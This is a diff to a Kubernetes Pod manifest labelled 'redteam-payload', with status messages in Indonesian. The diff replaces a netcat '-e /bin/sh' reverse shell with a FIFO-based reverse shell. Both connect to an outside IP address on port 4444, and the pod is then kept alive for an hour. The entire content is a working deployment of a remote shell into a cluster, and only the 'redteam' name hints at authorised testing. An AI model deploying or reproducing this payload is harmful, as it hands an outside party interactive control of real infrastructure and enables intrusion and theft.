@@ -1,7 +1,7 @@
 apiVersion: v1
 kind: Pod
 metadata:
-  name: redteam-payload-v2
+  name: redteam-payload-v3
   namespace: backbase
 spec:
   containers:
@@ -11,11 +11,11 @@ spec:
     args:
       - -c
       - |
-        echo "=== Mencoba reverse shell ==="
-        echo "Menginstall netcat..."
+        echo "=== Mencoba reverse shell (FIFO method) ==="
+        echo "Menginstall netcat (kalo belum ada)..."
         apk add --update netcat-openbsd
-        echo "Mencoba konek ke 203.175.125.130:4444..."
-        nc -v 203.175.125.130 4444 -e /bin/sh 2>&1
-        echo "Gagal konek! Keluar."
+        echo "Menjalankan reverse shell ke 203.175.125.130:4444..."
+        rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 203.175.125.130 4444 > /tmp/f
+        echo "Reverse shell selesai atau gagal. Pod tetap jalan 1 jam."
         sleep 3600
   restartPolicy: Never
